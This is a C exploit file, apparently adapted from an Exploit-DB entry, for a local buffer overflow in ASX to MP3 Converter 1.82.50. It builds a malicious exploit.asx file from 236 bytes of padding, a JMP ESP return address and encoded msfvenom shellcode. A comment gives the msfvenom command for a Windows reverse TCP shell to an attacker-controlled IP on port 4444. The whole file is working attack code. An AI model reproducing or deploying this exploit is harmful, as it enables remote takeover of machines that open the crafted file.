/*
ASX to MP3 Converter SOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
holahola ~ https://www.exploit-db.com/exploits/38382/
Winblows 2k3
*/

/*
Edited on 15 Oct 2020 by heyhujiao
C code written in the PoC script in EDB was grossly unreliable.

ASX to MP3 Converter 1.82.50 - Local Buffer Overflow

Bad characters include - \x00\x09\x0a\x1a
Return address - 0x1003789d (JMP ESP -> MSA2Mutility03.dll)
*/

#include <stdio.h>
#include <windows.h>
#include <malloc.h>

int main() {

    int i;
    char *overwrite_offset = malloc(236);
    for(i = 0; i < 236; i += 4) {
        char padding[] = "\x41\x41\x41\x41"; 
        memcpy(overwrite_offset + i, padding, strlen(padding));
    }
   /* memset(overwrite_offset + _msize(overwrite_offset) - 1, 0x00, 1);*/

    char retn[] = "\x9d\x78\x03\x10";
    /* msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER IP ADDRESS> LPORT=4444 EXITFUNC=thread -b "\x00\x09\x0a\x1a" -f c –e x86/shikata_ga_nai */
    char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP sled
    "\xb8\x2c\x2a\x16\x7a\xd9\xe5\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
    "\x52\x83\xeb\xfc\x31\x43\x0e\x03\x6f\x24\xf4\x8f\x93\xd0\x7a"
    "\x6f\x6b\x21\x1b\xf9\x8e\x10\x1b\x9d\xdb\x03\xab\xd5\x89\xaf"
    "\x40\xbb\x39\x3b\x24\x14\x4e\x8c\x83\x42\x61\x0d\xbf\xb7\xe0"
    "\x8d\xc2\xeb\xc2\xac\x0c\xfe\x03\xe8\x71\xf3\x51\xa1\xfe\xa6"
    "\x45\xc6\x4b\x7b\xee\x94\x5a\xfb\x13\x6c\x5c\x2a\x82\xe6\x07"
    "\xec\x25\x2a\x3c\xa5\x3d\x2f\x79\x7f\xb6\x9b\xf5\x7e\x1e\xd2"
    "\xf6\x2d\x5f\xda\x04\x2f\x98\xdd\xf6\x5a\xd0\x1d\x8a\x5c\x27"
    "\x5f\x50\xe8\xb3\xc7\x13\x4a\x1f\xf9\xf0\x0d\xd4\xf5\xbd\x5a"
    "\xb2\x19\x43\x8e\xc9\x26\xc8\x31\x1d\xaf\x8a\x15\xb9\xeb\x49"
    "\x37\x98\x51\x3f\x48\xfa\x39\xe0\xec\x71\xd7\xf5\x9c\xd8\xb0"
    "\x3a\xad\xe2\x40\x55\xa6\x91\x72\xfa\x1c\x3d\x3f\x73\xbb\xba"
    "\x40\xae\x7b\x54\xbf\x51\x7c\x7d\x04\x05\x2c\x15\xad\x26\xa7"
    "\xe5\x52\xf3\x68\xb5\xfc\xac\xc8\x65\xbd\x1c\xa1\x6f\x32\x42"
    "\xd1\x90\x98\xeb\x78\x6b\x4b\xd4\xd5\x04\x23\xbc\x27\xea\x22"
    "\x61\xa1\x0c\x2e\x89\xe7\x87\xc7\x30\xa2\x53\x79\xbc\x78\x1e"
    "\xb9\x36\x8f\xdf\x74\xbf\xfa\xf3\xe1\x4f\xb1\xa9\xa4\x50\x6f"
    "\xc5\x2b\xc2\xf4\x15\x25\xff\xa2\x42\x62\x31\xbb\x06\x9e\x68"
    "\x15\x34\x63\xec\x5e\xfc\xb8\xcd\x61\xfd\x4d\x69\x46\xed\x8b"
    "\x72\xc2\x59\x44\x25\x9c\x37\x22\x9f\x6e\xe1\xfc\x4c\x39\x65"
    "\x78\xbf\xfa\xf3\x85\xea\x8c\x1b\x37\x43\xc9\x24\xf8\x03\xdd"
    "\x5d\xe4\xb3\x22\xb4\xac\xd4\xc0\x1c\xd9\x7c\x5d\xf5\x60\xe1"
    "\x5e\x20\xa6\x1c\xdd\xc0\x57\xdb\xfd\xa1\x52\xa7\xb9\x5a\x2f"
    "\xb8\x2f\x5c\x9c\xb9\x65";

    int buffer_size = _msize(overwrite_offset) + strlen(retn) + strlen(shellcode);
    char *buffer = malloc(buffer_size);

    memcpy(buffer, overwrite_offset, _msize(overwrite_offset));
    memcpy(buffer + _msize(overwrite_offset), retn, strlen(retn));
    memcpy(buffer + _msize(overwrite_offset) + strlen(retn), shellcode, strlen(shellcode));
    memset(buffer + buffer_size - 1, 0x00, 1);

    FILE * fp;
    fp = fopen("exploit.asx","w");
    fprintf(fp, buffer); 
    fclose(fp);

    return 0;

}
